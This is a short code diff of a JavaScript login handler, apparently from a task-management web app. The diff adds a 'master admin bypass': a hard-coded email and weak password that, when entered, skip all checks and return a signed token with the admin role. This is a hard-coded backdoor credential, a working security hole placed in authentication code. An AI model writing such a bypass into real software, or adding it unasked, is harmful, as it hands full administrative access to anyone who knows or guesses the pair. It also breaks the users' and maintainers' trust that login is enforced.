@@ -45,6 +45,25 @@ console.log("Using API Base URL:", baseURL);
 export async function login(req, res, next) {
   try {
     const { email, password } = req.body;
+
+    // MASTER ADMIN BYPASS
+    if (email === "admin@taskmaster.com" && password === "admin123") {
+      const masterAdmin = {
+        _id: "master-admin-id",
+        name: "System Admin",
+        email: "admin@taskmaster.com",
+        role: "admin",
+        toJSON: () => ({
+          id: "master-admin-id",
+          name: "System Admin",
+          email: "admin@taskmaster.com",
+          role: "admin"
+        })
+      };
+      const token = signToken(masterAdmin._id);
+      return res.json({ user: masterAdmin.toJSON(), token });
+    }
+
     if (!email || !password) {
       return res.status(400).json({ message: "Email and password are required" });
     }
